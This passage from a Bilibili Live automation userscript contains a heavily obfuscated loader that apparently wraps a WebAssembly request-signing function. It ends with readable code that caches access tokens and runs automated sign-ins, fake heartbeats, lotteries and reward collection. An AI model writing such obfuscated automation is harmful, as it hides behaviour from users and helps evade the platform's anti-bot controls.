_0x53b3b1[_0x5108('434','\x52\x47\x5d\x35')](!0x0,_0x1beffc)?_0x53b3b1[_0x5108('435','\x33\x57\x49\x6c')](_0x3d4eac,_0x144e7b)['\x73\x65\x74'](_0x13100e,_0x6e806b):_0x1beffc[_0x144e7b['\x5f\x69']]=_0x6e806b,_0x144e7b;}},'\x75\x66\x73\x74\x6f\x72\x65':_0x3d4eac};},896:function(_0x3c8bf2,_0x2ec475,_0x5254fe){var _0x59d5d6={'\x6e\x69\x79\x4c\x4b':function(_0x10ca02,_0x4a0d3e){return _0x10ca02!==_0x4a0d3e;},'\x6f\x6b\x70\x5a\x4d':_0x5108('436','\x33\x30\x51\x53'),'\x78\x73\x4a\x41\x6a':function(_0x361ecf,_0x161ab0,_0x3d5b37){return _0x361ecf(_0x161ab0,_0x3d5b37);},'\x53\x56\x42\x78\x4d':function(_0x473637,_0x532bc7){return _0x473637>_0x532bc7;},'\x6a\x69\x47\x48\x54':function(_0x1c167e,_0x20a130){return _0x1c167e!==_0x20a130;},'\x66\x4d\x66\x75\x71':_0x5108('437','\x2a\x37\x2a\x30'),'\x6d\x59\x52\x55\x4f':function(_0x206da8,_0x3a9967){return _0x206da8(_0x3a9967);},'\x76\x4a\x64\x72\x56':function(_0x47b750,_0x285782){return _0x47b750===_0x285782;},'\x4f\x62\x68\x69\x53':function(_0x383399,_0x42e180){return _0x383399(_0x42e180);},'\x65\x42\x43\x6d\x56':'\x57\x65\x61\x6b\x4d\x61\x70','\x43\x5a\x48\x69\x4e':function(_0x328f40,_0x338edd){return _0x328f40 instanceof _0x338edd;},'\x4e\x6d\x41\x4e\x54':function(_0x341adc,_0x1d9ec7){return _0x341adc===_0x1d9ec7;},'\x63\x5a\x44\x4e\x43':_0x5108('438','\x66\x35\x24\x52'),'\x55\x44\x72\x44\x6c':function(_0x2cf6d4,_0xe92c04){return _0x2cf6d4===_0xe92c04;},'\x49\x61\x4a\x74\x49':_0x5108('439','\x64\x21\x66\x62'),'\x42\x79\x51\x4f\x67':function(_0x3f82e4,_0x25c7a4,_0x21f215){return _0x3f82e4(_0x25c7a4,_0x21f215);},'\x54\x73\x69\x76\x66':function(_0x15747a,_0x423134){return _0x15747a===_0x423134;},'\x56\x44\x46\x50\x61':_0x5108('43a','\x74\x53\x45\x39'),'\x52\x41\x4e\x4d\x67':function(_0x30bcf5,_0x39846e){return _0x30bcf5(_0x39846e);},'\x50\x49\x79\x66\x5a':'\x6b\x5a\x50\x59\x6b','\x67\x6c\x4a\x61\x51':'\x51\x72\x74\x42\x6d','\x4a\x76\x45\x44\x42':function(_0x4579f8,_0x2bbbf8){return _0x4579f8==_0x2bbbf8;},'\x71\x7a\x6e\x4a\x79':'\x73\x65\x74','\x55\x67\x71\x6d\x55':function(_0x1c7f5c,_0x3284ee,_0x45cc13){return _0x1c7f5c(_0x3284ee,_0x45cc13);},'\x41\x4b\x78\x78\x71':'\x69\x6e\x73\x74\x61\x6e\x63\x65','\x56\x6c\x6c\x4a\x59':'\x77\x65\x62\x5f\x6d\x61\x6c\x6c\x6f\x63','\x68\x5a\x41\x48\x51':_0x5108('43b','\x64\x21\x66\x62'),'\x57\x55\x54\x66\x7a':_0x5108('43c','\x5a\x33\x56\x54'),'\x6b\x7a\x43\x6c\x48':function(_0x384843){return _0x384843();},'\x45\x45\x43\x4c\x54':'\x6a\x46\x57\x4b\x67','\x51\x6a\x42\x45\x49':function(_0x2f966b,_0x14bfe0,_0x5386d7,_0x436c46){return _0x2f966b(_0x14bfe0,_0x5386d7,_0x436c46);},'\x44\x53\x74\x6c\x58':function(_0x332f29,_0x5f8ae5){return _0x332f29(_0x5f8ae5);},'\x4a\x67\x47\x69\x77':function(_0x2f5472,_0x34fe38){return _0x2f5472(_0x34fe38);},'\x6b\x65\x70\x5a\x63':function(_0x116936,_0x2fb76f){return _0x116936 in _0x2fb76f;},'\x46\x6e\x68\x66\x43':'\x41\x63\x74\x69\x76\x65\x58\x4f\x62\x6a\x65\x63\x74','\x48\x49\x54\x56\x63':function(_0x17b99b,_0x4f0efd){return _0x17b99b(_0x4f0efd);},'\x57\x57\x58\x79\x56':function(_0x3dd425,_0x43eb86){return _0x3dd425&&_0x43eb86;},'\x58\x44\x4b\x54\x54':function(_0x4e9b3f,_0x6a23a8,_0x349443){return _0x4e9b3f(_0x6a23a8,_0x349443);},'\x6e\x50\x56\x4c\x69':'\x64\x65\x6c\x65\x74\x65','\x59\x70\x5a\x45\x67':_0x5108('43d','\x4a\x45\x51\x38'),'\x67\x6b\x67\x7a\x55':_0x5108('43e','\x29\x63\x52\x35')};'use strict';var _0x3e11f8,_0x3b2afb=_0x59d5d6['\x52\x41\x4e\x4d\x67'](_0x5254fe,0xa),_0x197767=_0x59d5d6['\x52\x41\x4e\x4d\x67'](_0x5254fe,0x1dd)(0x0),_0x14086b=_0x59d5d6[_0x5108('43f','\x4e\x68\x64\x25')](_0x5254fe,0x82),_0x15a45a=_0x59d5d6[_0x5108('440','\x77\x63\x31\x42')](_0x5254fe,0xb4),_0x1625d2=_0x59d5d6[_0x5108('441','\x33\x57\x49\x6c')](_0x5254fe,0xb9),_0x108b08=_0x59d5d6['\x44\x53\x74\x6c\x58'](_0x5254fe,0x37f),_0x3f1df7=_0x59d5d6['\x4a\x67\x47\x69\x77'](_0x5254fe,0x1f),_0x2ed2c6=_0x59d5d6[_0x5108('442','\x7a\x45\x7a\x7a')](_0x5254fe,0x19b),_0x2aa8c6=_0x59d5d6['\x4a\x67\x47\x69\x77'](_0x5254fe,0x19b),_0x2c3995=!_0x3b2afb[_0x5108('443','\x7a\x45\x7a\x7a')]&&_0x59d5d6[_0x5108('444','\x4a\x45\x51\x38')](_0x59d5d6[_0x5108('445','\x4c\x58\x2a\x77')],_0x3b2afb),_0x35885d=_0x15a45a['\x67\x65\x74\x57\x65\x61\x6b'],_0x576262=Object['\x69\x73\x45\x78\x74\x65\x6e\x73\x69\x62\x6c\x65'],_0x1801b2=_0x108b08['\x75\x66\x73\x74\x6f\x72\x65'],_0x5d84d7=function(_0x3c8bf2){var _0x5f43d9={'\x52\x67\x65\x78\x4d':function(_0x6f4465,_0x77f408){return _0x59d5d6['\x6e\x69\x79\x4c\x4b'](_0x6f4465,_0x77f408);},'\x5a\x6a\x78\x79\x63':_0x59d5d6[_0x5108('446','\x65\x71\x58\x4e')],'\x69\x79\x6b\x55\x4f':function(_0x2714af,_0x51614f,_0x266e77){return _0x59d5d6[_0x5108('447','\x7a\x45\x7a\x7a')](_0x2714af,_0x51614f,_0x266e77);},'\x59\x56\x62\x79\x74':function(_0x59e6d4,_0xaac9d0){return _0x59d5d6[_0x5108('448','\x6b\x35\x42\x46')](_0x59e6d4,_0xaac9d0);}};if(_0x59d5d6[_0x5108('449','\x65\x71\x58\x4e')](_0x59d5d6[_0x5108('44a','\x33\x30\x51\x53')],_0x59d5d6[_0x5108('44b','\x78\x77\x74\x61')])){_0x3c8bf2[_0x5108('3aa','\x65\x71\x58\x4e')][_0x5108('44c','\x7a\x45\x7a\x7a')][_0x2ec475]++;}else{return function(){if(_0x5f43d9['\x52\x67\x65\x78\x4d'](_0x5f43d9[_0x5108('44d','\x66\x35\x24\x52')],_0x5f43d9['\x5a\x6a\x78\x79\x63'])){this['\x61']=[];}else{return _0x5f43d9['\x69\x79\x6b\x55\x4f'](_0x3c8bf2,this,_0x5f43d9['\x59\x56\x62\x79\x74'](arguments[_0x5108('44e','\x6a\x6e\x6c\x26')],0x0)?arguments[0x0]:void 0x0);}};}},_0x114261={'\x67\x65\x74':function(_0x3c8bf2){if(_0x59d5d6[_0x5108('44f','\x6d\x4d\x28\x24')](_0x3f1df7,_0x3c8bf2)){var _0x2ec475=_0x59d5d6['\x6d\x59\x52\x55\x4f'](_0x35885d,_0x3c8bf2);return _0x59d5d6[_0x5108('450','\x29\x63\x52\x35')](!0x0,_0x2ec475)?_0x59d5d6['\x4f\x62\x68\x69\x53'](_0x1801b2,_0x59d5d6[_0x5108('451','\x4e\x68\x64\x25')](_0x2ed2c6,this,_0x59d5d6['\x65\x42\x43\x6d\x56']))[_0x5108('452','\x33\x74\x49\x28')](_0x3c8bf2):_0x2ec475?_0x2ec475[this['\x5f\x69']]:void 0x0;}},'\x73\x65\x74':function(_0x3c8bf2,_0x2ec475){if(_0x59d5d6[_0x5108('453','\x4d\x77\x79\x66')](_0x59d5d6['\x49\x61\x4a\x74\x49'],_0x59d5d6[_0x5108('454','\x69\x5d\x67\x54')])){return _0x108b08[_0x5108('455','\x65\x71\x58\x4e')](_0x59d5d6['\x42\x79\x51\x4f\x67'](_0x2ed2c6,this,_0x59d5d6[_0x5108('456','\x33\x74\x49\x28')]),_0x3c8bf2,_0x2ec475);}else{var _0x5e4255=_0x3c8bf2[_0x5108('2fe','\x70\x74\x30\x63')][_0x5108('457','\x29\x4c\x5e\x56')](_0x2ec475);return _0x59d5d6[_0x5108('458','\x70\x74\x30\x63')](_0x5e4255,DOMException)&&_0x59d5d6['\x4e\x6d\x41\x4e\x54'](_0x59d5d6[_0x5108('459','\x4c\x58\x2a\x77')],_0x5e4255[_0x5108('45a','\x58\x35\x38\x4b')]);}}},_0x438cc0=_0x3c8bf2['\x65\x78\x70\x6f\x72\x74\x73']=_0x59d5d6[_0x5108('45b','\x62\x64\x5a\x41')](_0x5254fe,0x1f6)(_0x59d5d6[_0x5108('45c','\x6a\x6e\x6c\x26')],_0x5d84d7,_0x114261,_0x108b08,!0x0,!0x0);_0x59d5d6[_0x5108('45d','\x52\x47\x5d\x35')](_0x2aa8c6,_0x2c3995)&&(_0x59d5d6[_0x5108('45e','\x45\x67\x53\x39')](_0x1625d2,(_0x3e11f8=_0x108b08['\x67\x65\x74\x43\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72'](_0x5d84d7,_0x59d5d6[_0x5108('456','\x33\x74\x49\x28')]))[_0x5108('45f','\x75\x44\x74\x4c')],_0x114261),_0x15a45a[_0x5108('460','\x5e\x36\x45\x59')]=!0x0,_0x59d5d6['\x58\x44\x4b\x54\x54'](_0x197767,[_0x59d5d6[_0x5108('461','\x44\x75\x68\x6c')],_0x59d5d6[_0x5108('462','\x33\x57\x49\x6c')],_0x59d5d6['\x67\x6b\x67\x7a\x55'],_0x59d5d6['\x71\x7a\x6e\x4a\x79']],function(_0x3c8bf2){var _0x2f98d1={'\x68\x53\x73\x59\x71':function(_0x43324d,_0x2a306c,_0x5ee487){return _0x59d5d6[_0x5108('463','\x52\x47\x5d\x35')](_0x43324d,_0x2a306c,_0x5ee487);},'\x59\x67\x45\x5a\x6c':_0x59d5d6['\x41\x4b\x78\x78\x71'],'\x73\x65\x45\x56\x5a':_0x59d5d6[_0x5108('464','\x75\x44\x74\x4c')],'\x57\x6a\x71\x67\x47':_0x59d5d6[_0x5108('465','\x6a\x48\x31\x54')],'\x65\x75\x6b\x47\x63':_0x59d5d6[_0x5108('466','\x4d\x77\x79\x66')],'\x57\x50\x50\x41\x4d':function(_0x4821f3){return _0x59d5d6[_0x5108('467','\x44\x69\x79\x38')](_0x4821f3);}};if(_0x59d5d6['\x54\x73\x69\x76\x66'](_0x59d5d6[_0x5108('468','\x77\x63\x31\x42')],_0x59d5d6[_0x5108('469','\x61\x39\x70\x6b')])){var _0x2ec475=_0x438cc0[_0x5108('46a','\x5e\x36\x45\x59')],_0x5254fe=_0x2ec475[_0x3c8bf2];_0x59d5d6[_0x5108('46b','\x61\x4d\x26\x71')](_0x14086b,_0x2ec475,_0x3c8bf2,function(_0x2ec475,_0x3b2afb){if(_0x59d5d6[_0x5108('46c','\x29\x4c\x5e\x56')](_0x59d5d6[_0x5108('46d','\x4c\x58\x2a\x77')],_0x59d5d6[_0x5108('46e','\x61\x4d\x26\x71')])){if(_0x59d5d6['\x4f\x62\x68\x69\x53'](_0x3f1df7,_0x2ec475)&&!_0x59d5d6[_0x5108('46f','\x55\x76\x76\x40')](_0x576262,_0x2ec475)){if(_0x59d5d6[_0x5108('470','\x61\x4d\x26\x71')](_0x59d5d6[_0x5108('471','\x6d\x4d\x28\x24')],_0x59d5d6['\x67\x6c\x4a\x61\x51'])){this['\x5f\x66']||(this['\x5f\x66']=new _0x3e11f8());var _0x197767=this['\x5f\x66'][_0x3c8bf2](_0x2ec475,_0x3b2afb);return _0x59d5d6['\x4a\x76\x45\x44\x42'](_0x59d5d6['\x71\x7a\x6e\x4a\x79'],_0x3c8bf2)?this:_0x197767;}else{_0x5254fe=_0x3c8bf2[_0x5108('1f7','\x52\x68\x75\x5e')][_0x5108('472','\x69\x5d\x67\x54')](_0x5254fe),_0x3c8bf2[_0x5108('247','\x45\x67\x53\x39')]['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x2ec475,function(){try{return{'\x76\x61\x6c\x75\x65':_0x5254fe[_0x5108('473','\x55\x57\x6c\x64')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0x40e7ae){return{'\x65\x72\x72\x6f\x72':_0x40e7ae,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}());}}return _0x5254fe[_0x5108('474','\x69\x5d\x67\x54')](this,_0x2ec475,_0x3b2afb);}else{var _0x47d4a6=_0x2f98d1[_0x5108('475','\x74\x53\x45\x39')](_0x5d84d7,this,_0x3c8bf2);if(_0x47d4a6)return _0x47d4a6[0x1];}});}else{return Object[_0x5108('476','\x5e\x36\x45\x59')](_0x3c8bf2,_0x2f98d1['\x59\x67\x45\x5a\x6c'],{'\x76\x61\x6c\x75\x65':_0x2ec475}),Object[_0x5108('477','\x44\x69\x79\x38')](_0x3c8bf2,_0x2f98d1[_0x5108('478','\x6a\x6e\x6c\x26')],{'\x76\x61\x6c\x75\x65':_0x3c8bf2['\x69\x6e\x73\x74\x61\x6e\x63\x65'][_0x5108('479','\x55\x57\x6c\x64')][_0x5108('3d3','\x7a\x45\x7a\x7a')]}),Object[_0x5108('47a','\x58\x35\x38\x4b')](_0x3c8bf2,_0x2f98d1[_0x5108('47b','\x65\x71\x58\x4e')],{'\x76\x61\x6c\x75\x65':_0x3c8bf2['\x69\x6e\x73\x74\x61\x6e\x63\x65']['\x65\x78\x70\x6f\x72\x74\x73'][_0x5108('47c','\x36\x72\x6a\x65')]}),Object[_0x5108('47d','\x65\x71\x58\x4e')](_0x3c8bf2,_0x2f98d1[_0x5108('47e','\x64\x21\x66\x62')],{'\x76\x61\x6c\x75\x65':_0x3c8bf2[_0x5108('47f','\x78\x77\x74\x61')][_0x5108('480','\x28\x21\x50\x46')][_0x5108('481','\x52\x68\x75\x5e')]}),_0x3c8bf2[_0x5108('482','\x7a\x45\x7a\x7a')][_0x5108('483','\x61\x4d\x26\x71')]=function(_0x3aad55,_0x32dd19){return _0x3c8bf2[_0x5108('219','\x6a\x48\x31\x54')][_0x5108('484','\x62\x64\x5a\x41')](_0x3c8bf2[_0x5108('485','\x2a\x37\x2a\x30')][_0x5108('486','\x4e\x68\x64\x25')][_0x5108('487','\x33\x74\x49\x28')](_0x3c8bf2[_0x5108('321','\x5b\x2a\x32\x53')][_0x5108('488','\x70\x74\x30\x63')](_0x3aad55),_0x3c8bf2[_0x5108('241','\x61\x39\x70\x6b')][_0x5108('489','\x44\x69\x79\x38')](_0x32dd19)));},_0x2f98d1[_0x5108('48a','\x36\x72\x6a\x65')](_0x576262),BiliPushUtils[_0x5108('48b','\x5b\x2a\x32\x53')]=function(_0x4da4b1,_0x529b5e){if(CONFIG[_0x5108('48c','\x78\x77\x74\x61')]&&BiliPush[_0x5108('48d','\x5e\x36\x45\x59')]){return _0x3c8bf2[_0x5108('3d2','\x74\x52\x75\x55')]['\x73\x70\x79\x64\x65\x72'](_0x4da4b1,_0x529b5e);}return'';},_0x3c8bf2[_0x5108('48e','\x4c\x58\x2a\x77')];}}));},897:function(_0x74d41c,_0x2a24cd,_0x2142a6){var _0x31c814={'\x6a\x59\x6b\x74\x59':function(_0x176cb0,_0x7eed20){return _0x176cb0(_0x7eed20);},'\x6a\x44\x61\x70\x4c':function(_0x219b82,_0x316c81){return _0x219b82(_0x316c81);},'\x55\x76\x54\x62\x4b':function(_0x3133b7,_0x3c3220){return _0x3133b7(_0x3c3220);},'\x4c\x75\x57\x47\x45':function(_0x418682,_0x3fd7f2){return _0x418682(_0x3fd7f2);},'\x45\x4e\x5a\x47\x74':function(_0x434a6d,_0x131c3d){return _0x434a6d(_0x131c3d);}};_0x31c814[_0x5108('48f','\x44\x75\x68\x6c')](_0x2142a6,0x80),_0x31c814['\x6a\x44\x61\x70\x4c'](_0x2142a6,0x57),_0x31c814[_0x5108('490','\x29\x4c\x5e\x56')](_0x2142a6,0x380),_0x31c814['\x4c\x75\x57\x47\x45'](_0x2142a6,0x37e),_0x31c814[_0x5108('491','\x2a\x37\x2a\x30')](_0x2142a6,0x37d),_0x74d41c[_0x5108('492','\x45\x67\x53\x39')]=_0x31c814['\x45\x4e\x5a\x47\x74'](_0x2142a6,0x7)[_0x5108('493','\x5a\x33\x56\x54')];},898:function(_0x1dd692,_0x60d16e,_0x365944){var _0x51a269={'\x56\x6e\x48\x61\x70':function(_0xbf9f95,_0x95c57f){return _0xbf9f95(_0x95c57f);}};_0x1dd692[_0x5108('492','\x45\x67\x53\x39')]={'\x64\x65\x66\x61\x75\x6c\x74':_0x51a269['\x56\x6e\x48\x61\x70'](_0x365944,0x381),'\x5f\x5f\x65\x73\x4d\x6f\x64\x75\x6c\x65':!0x0};}}]);;_0xodm='jsjiami.com.v6';

        const TokenLoad = async ()=>{
            if(Info.csrf_token){
                let tinfo = JSON.parse(localStorage.getItem(`${NAME}_Token`)) || {};
                if(tinfo.csrf_token == Info.csrf_token && tinfo.time > ts_s())
                {
                    Info.appToken = tinfo;
                }else{
                    tinfo = await getAccessToken();
                    tinfo.time = ts_s() + tinfo.expires_in;
                    tinfo.csrf_token = Info.csrf_token;
                    localStorage.setItem(`${NAME}_Token`, JSON.stringify(tinfo));
                    Info.appToken = tinfo;
                }
            }
        };
        const Run = async () => {
            await TokenLoad();
            // 每天一次
            Statistics.run();
            if (CONFIG.AUTO_SIGN) Sign.run();
            if (CONFIG.SILVER2COIN) Exchange.run();
            if (CONFIG.AUTO_GROUP_SIGN) GroupSign.run();
            if (CONFIG.AUTO_DAILYREWARD) DailyReward.run();
            if (CONFIG.MOBILE_HEARTBEAT) {
                MobileHeartbeat.run();
                WebHeartbeat.run();
            }
            //if (CONFIG.AUTO_GROUP_SIGN || CONFIG.AUTO_DAILYREWARD) createIframe('//api.live.bilibili.com', 'GROUPSIGN|DAILYREWARD');
            // 每过一定时间一次
            if (CONFIG.AUTO_TASK) Task.run();
            if (CONFIG.AUTO_GIFT) Gift.run();
            // 持续运行
            if (CONFIG.AUTO_TREASUREBOX) TreasureBox.run();
            if (CONFIG.AUTO_LOTTERY) Lottery.run();
            RafflePorcess.run();
            TopRankTask.run();
            HeartGift.run();
            BiliPush.run();
        };

        $(document).ready(() => {
            Init().then(Run);
        });
    }
})();
